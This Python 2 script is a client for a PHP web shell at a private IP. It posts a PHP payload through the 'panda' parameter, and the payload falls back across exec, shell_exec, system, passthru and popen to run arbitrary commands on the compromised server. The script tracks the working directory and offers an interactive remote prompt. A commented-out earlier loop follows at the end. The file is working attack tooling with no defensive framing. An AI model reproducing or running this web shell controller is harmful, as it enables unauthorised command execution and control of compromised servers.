__author__ = 'panda'
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

shell_url = "http://192.168.211.190/1/2.php"
cmd = "function Exec_Run($cmd) { $res = ''; 	if(function_exists('exec')){		@exec($cmd,$res);		$res = join(\"\n\",$res);	} 	elseif(function_exists('shell_exec')){		$res = @shell_exec($cmd);	} 	elseif(function_exists('system')){		@ob_start();		@system($cmd);		$res = @ob_get_contents();@ob_end_clean();	} 	elseif(function_exists('passthru')){		@ob_start();		@passthru($cmd);		$res = @ob_get_contents();		@ob_end_clean();	} 	elseif(@is_resource($f = @popen($cmd,\"r\"))){		$res = '';		while(!@feof($f)){			$res .= @fread($f,1024);		}		@pclose($f);	} 	return $res; } print Exec_Run('%s');"
# cmd = "passthru(%s);"
# print type(pwd.encode('utf-8'))
pwd = requests.post(shell_url, dict(panda=(cmd % 'cd'))).text.strip()
pwd = re.search(r'[a-zA-Z]:[\\\\ \w]*', pwd).group()  # \s[a-zA-Z]:(\\[\w ]+)+\\.+

command_d = pwd.encode('utf-8')
command = raw_input(pwd.encode('utf-8') + '>')
while True:
    if command.strip().startswith('cd'):
        command = cmd % ('cd ' + command_d + ' & ' + command.strip() + " & cd")
        command_d = ((requests.post(shell_url, dict(panda=command))).text.strip()).encode('utf-8')
        command_d = re.search(r'[a-zA-Z]:[\\\\ \w]*', command_d).group()  # print dird
        command = raw_input(command_d + '>')
    else:
        print requests.post(shell_url, dict(panda=(cmd % ('cd ' + command_d + ' & ' + command)))).text.strip()
        command = raw_input(command_d + '>')
'''
while True:

    command = raw_input(pwd.encode('utf-8') + '>')
    #print command
    #params = dict(clan=(cmd % command))
    #r = requests.post(shell_url, params)
    #print r.text.strip()[3:]
    if command.strip().startswith('cd'):
        command = cmd % (command + "& cd")
        pwd = requests.post(shell_url, dict(panda=command).text.strip().encode('utf-8'))
        command = raw_input(pwd + '>')
    else:
        print requests.post(shell_url, dict(panda=(cmd % command))).text.strip()
'''